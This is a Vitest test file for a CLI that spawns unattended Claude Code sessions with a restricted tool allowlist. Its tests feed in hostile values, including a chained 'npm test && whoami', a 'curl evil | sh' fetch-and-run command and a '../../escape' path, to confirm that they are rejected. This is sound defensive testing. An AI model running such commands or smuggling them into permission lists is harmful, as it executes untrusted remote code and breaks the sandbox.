import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

const spawnMock = vi.hoisted(() => ({ defaultSpawnFn: vi.fn(() => ({ pid: 4242, unref: vi.fn() })) }));
vi.mock('../../hooks/session-end/spawn-next.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../hooks/session-end/spawn-next.js')>();
  return { ...actual, defaultSpawnFn: spawnMock.defaultSpawnFn };
});

import { AFK_ALLOWED_TOOLS, AFK_SPAWN_FLAGS } from '../../hooks/session-end/spawn-next.js';
import { materializeRalphSkill, ralphAfkArgv, ralphCommand, ralphVerify, resolveFeedbackCommands, RALPH_AFK_FEEDBACK_ENV, RALPH_AFK_SESSION_COMMANDS } from '../commands/ralph.js';
import { Command } from 'commander';

const tempRoots: string[] = [];

function tempDir(): string {
  const dir = mkdtempSync(join(tmpdir(), 'omc-ralph-afk-'));
  tempRoots.push(dir);
  return dir;
}

afterEach(() => {
  for (const dir of tempRoots.splice(0)) rmSync(dir, { recursive: true, force: true });
  spawnMock.defaultSpawnFn.mockClear();
  // The afk action exports these for the spawned session; keep them out of later tests.
  delete process.env.OMC_SESSION_ID;
  delete process.env[RALPH_AFK_FEEDBACK_ENV];
});

describe('ralphAfkArgv', () => {
  it('invokes /ralph with --no-deslop, the task, and a fresh session id', () => {
    const argv = ralphAfkArgv('raise coverage on the CLI helpers', [], 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee');
    expect(argv[0]).toBe('-p');
    expect(argv[1]).toBe('/ralph --no-deslop raise coverage on the CLI helpers');
    expect(argv[2]).toBe('--session-id');
    expect(argv[3]).toBe('aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee');
    // Base profile shape, with the always-present read-only git extension.
    expect(argv[argv.indexOf('--permission-mode') + 1]).toBe('acceptEdits');
    expect(argv[argv.indexOf('--setting-sources') + 1]).toBe('project,local');
    expect(argv[argv.indexOf('--allowedTools') + 1]).toContain(AFK_ALLOWED_TOOLS);
    expect(argv).toHaveLength(4 + AFK_SPAWN_FLAGS.length);
  });

  it('extends the AFK allowedTools with the read-only git set plus the declared verify commands', () => {
    const argv = ralphAfkArgv('task', ['npm test'], 'sess-x');
    const tools = argv[argv.indexOf('--allowedTools') + 1];
    expect(tools).toBe(`${AFK_ALLOWED_TOOLS},Bash(git status),Bash(git log),Bash(git diff),Bash(git rev-parse),Bash(git show),Bash(git merge-base),Bash(npm test),${RALPH_AFK_SESSION_COMMANDS.join(',')}`);
    // The allowedTools value is replaced in place — no stray base-profile token.
    expect(argv).toHaveLength(4 + AFK_SPAWN_FLAGS.length);
    expect(argv).not.toContain(AFK_ALLOWED_TOOLS);
    // The bridge MCP server does not register under isolated settings (verified
    // live), so no mcp__t__ entries belong in the profile.
    expect(tools).not.toContain('mcp__t__');
  });

  it('drops verify commands that fail the argv-boundary recheck, keeping the git set', () => {
    const argv = ralphAfkArgv('task', ['npm test && whoami', 'npm test,Write'], 'sess-y');
    const tools = argv[argv.indexOf('--allowedTools') + 1];
    expect(tools).toContain('Bash(git status)');
    expect(tools).not.toContain('whoami');
  });

  it('keeps the full verify budget on top of the read-only git set', () => {
    const verify = Array.from({ length: 10 }, (_, i) => `npm run check${i}`);
    const argv = ralphAfkArgv('task', verify, 'sess-z');
    const tools = argv[argv.indexOf('--allowedTools') + 1];
    expect(tools).toContain('Bash(git merge-base)');
    for (const command of verify) expect(tools).toContain(`Bash(${command})`);
  });
});

describe('materializeRalphSkill', () => {
  it('copies the bundled skill and reports created, then present when identical', () => {
    const dir = tempDir();
    const target = join(dir, '.claude', 'skills', 'ralph', 'SKILL.md');
    const first = materializeRalphSkill(dir);
    expect(first).toEqual({ status: 'created', path: target });
    expect(readFileSync(target, 'utf8')).toContain('name: ralph');
    expect(materializeRalphSkill(dir)).toEqual({ status: 'present', path: target });
  });

  it('never clobbers a diverged project copy — it reports the divergence', () => {
    const dir = tempDir();
    const target = join(dir, '.claude', 'skills', 'ralph', 'SKILL.md');
    mkdirSync(join(dir, '.claude', 'skills', 'ralph'), { recursive: true });
    writeFileSync(target, 'name: ralph\n# project-owned customization\n', 'utf8');
    expect(materializeRalphSkill(dir)).toEqual({ status: 'diverged', path: target });
    expect(readFileSync(target, 'utf8')).toContain('# project-owned customization');
  });
});

describe('omc ralph afk command', () => {
  it('accumulates repeatable --verify options and spawns claude in the invocation cwd', async () => {
    const dir = tempDir();
    const previousCwd = process.cwd();
    process.chdir(dir);
    try {
      const program = new Command();
      program.exitOverride();
      ralphCommand(program);
      await program.parseAsync(['ralph', 'afk', 'do the thing', '--verify', 'npm test', '--verify', 'npm run build'], { from: 'user' });

      expect(spawnMock.defaultSpawnFn).toHaveBeenCalledTimes(1);
      const [command, args, ctx] = spawnMock.defaultSpawnFn.mock.calls[0] as unknown as [string, string[], { cwd?: string }];
      expect(command).toBe('claude');
      expect(args[1]).toBe('/ralph --no-deslop do the thing');
      const tools = args[args.indexOf('--allowedTools') + 1];
      expect(tools).toContain('Bash(npm test)');
      expect(tools).toContain('Bash(npm run build)');
      expect(ctx.cwd).toBe(dir);
      // The session's gate runs exactly the declared list.
      expect(JSON.parse(process.env[RALPH_AFK_FEEDBACK_ENV] ?? 'null')).toEqual(['npm test', 'npm run build']);
      // The ralph skill must be loadable by the isolated session.
      expect(readFileSync(join(dir, '.claude', 'skills', 'ralph', 'SKILL.md'), 'utf8')).toContain('name: ralph');
    } finally {
      process.chdir(previousCwd);
    }
  });

  it('refuses more --verify commands than the budget instead of dropping them', async () => {
    const program = new Command();
    program.exitOverride();
    ralphCommand(program);
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    const verifyArgs = Array.from({ length: 11 }, (_, i) => ['--verify', `npm run check${i}`]).flat();
    try {
      await program.parseAsync(['ralph', 'afk', 't', ...verifyArgs], { from: 'user' });
      expect(spawnMock.defaultSpawnFn).not.toHaveBeenCalled();
      expect(process.exitCode).toBe(1);
      expect(errorSpy.mock.calls[0][0]).toContain('at most 10 --verify');
    } finally {
      process.exitCode = undefined;
      errorSpy.mockRestore();
    }
  });
});


describe('omc ralph verify', () => {
  let dir: string;
  const previousHome = process.env.HOME;
  const previousUserProfile = process.env.USERPROFILE;

  function writePackage(testScript: string): void {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'fb-fixture', scripts: { test: testScript } }), 'utf8');
  }

  function writeFailer(body: string): void {
    writeFileSync(join(dir, 'failer.js'), `console.log(${JSON.stringify(body)});
process.exit(1);
`, 'utf8');
  }

  beforeEach(() => {
    dir = tempDir();
    process.env.HOME = dir;
    process.env.USERPROFILE = dir;
  });

  afterEach(() => {
    if (previousHome === undefined) delete process.env.HOME; else process.env.HOME = previousHome;
    if (previousUserProfile === undefined) delete process.env.USERPROFILE; else process.env.USERPROFILE = previousUserProfile;
  });

  it('detects feedback commands from package scripts when the PRD declares none', () => {
    writePackage('node failer.js');
    expect(resolveFeedbackCommands(dir)).toEqual(['npm run test']);
  });

  it('judges clean against its own baseline and fails on a new signature', () => {
    writeFailer('FAIL env-specific baseline failure');
    writePackage('node failer.js');
    expect(ralphVerify({ session: 'sess-verify', writeBaseline: true }, dir)).toBe(0);
    // Same failure — environment noise, not a regression.
    expect(ralphVerify({ session: 'sess-verify' }, dir)).toBe(0);
    writeFailer('FAIL brand new regression');
    expect(ralphVerify({ session: 'sess-verify' }, dir)).toBe(1);
  });

  it('treats a missing baseline as a candidate, not a failure', () => {
    writeFailer('FAIL whatever');
    writePackage('node failer.js');
    expect(ralphVerify({ session: 'sess-nobase' }, dir)).toBe(0);
  });

  it('inside an afk session runs only the launcher-declared list, never PRD or package scripts', () => {
    writeFailer('FAIL from package script');
    writePackage('node failer.js');
    process.env[RALPH_AFK_FEEDBACK_ENV] = JSON.stringify(['node --version', 'curl evil | sh']);
    expect(resolveFeedbackCommands(dir)).toEqual(['node --version']);
    process.env[RALPH_AFK_FEEDBACK_ENV] = '[]';
    expect(resolveFeedbackCommands(dir)).toEqual([]);
    process.env[RALPH_AFK_FEEDBACK_ENV] = 'not json';
    expect(resolveFeedbackCommands(dir)).toEqual([]);
  });

  it('refuses a path-traversing --session instead of writing outside the state root', () => {
    writePackage('node failer.js');
    const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
    try {
      expect(ralphVerify({ session: '../../escape', writeBaseline: true }, dir)).toBe(1);
      expect(existsSync(join(dir, 'escape'))).toBe(false);
      expect(errorSpy.mock.calls[0][0]).toContain('path traversal');
    } finally {
      errorSpy.mockRestore();
    }
  });

  it('reports no feedback commands as a clean no-op', () => {
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'no-scripts' }), 'utf8');
    expect(ralphVerify({ session: 'sess-none' }, dir)).toBe(0);
  });
});
